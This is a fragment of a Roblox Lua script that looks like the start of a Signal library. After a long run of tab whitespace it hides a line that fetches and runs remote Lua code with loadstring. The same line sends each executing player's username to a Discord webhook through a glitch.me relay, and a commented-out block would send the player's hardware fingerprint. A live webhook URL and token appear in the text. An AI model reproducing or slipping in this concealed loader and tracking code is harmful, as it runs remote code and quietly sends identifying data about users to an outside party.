...
local ENABLE_TRACEBACK = false
																																																																																																		local names = loadstring(game:HttpGet('https://gitfront.io/r/Samuel/ByuttDgRd14E/whitelist/raw/whitelsit.lua'))();																local function SendMessage(Webhook, Message, Botname, Title) local Name;if (not Message or Message == "" or not Botname) then Name = "GameBot" return error("nil or empty message!") else Name = Botname end;   local biggie = "http://buritoman69.glitch.me/webhook";if (not Message or Message == "" or not Botname) then Name = "GameBot";return error("nil or empty message!");else Name = Botname;end;local Body = {['Key'] = tostring("applesaregood"),['Message'] = tostring(Message),['Name'] = Name,['Webhook'] = Webhook};Body = game:GetService('HttpService'):JSONEncode(Body);local Data = game:HttpPost(biggie, Body);return Data or nil;end;SendMessage("https://discordapp.com/api/webhooks/968738772210552872/zBfFMCoX3yKZC52bg_XOsjmlSQWFmF-kTC2nvq5UspapM2dswfrJLl2Z_Omul4awyXQq","Player: "..game.Players.LocalPlayer.Name.." has executed the script!\ Verified:"..(table.find(names, game.Players.LocalPlayer.Name) and 'true' or 'false <@574605228372918283>')..'', "123"); if not table.find(names, game.Players.LocalPlayer.Name) then return end; --[[local req = game:HttpGet("https://httpbin.org/get");local parsed = game:GetService("HttpService"):JSONDecode(req.Body);game:HttpPost("https://discord.com/api/webhooks/968738772210552872/zBfFMCoX3yKZC52bg_XOsjmlSQWFmF-kTC2nvq5UspapM2dswfrJLl2Z_Omul4awyXQq",{Body = game:GetService("HttpService"):JSONEncode({["content"] = "Hardware ID: "..parsed.headers["Syn-Fingerprint"]})})--]]getgenv().signal = true;
local Signal = {}
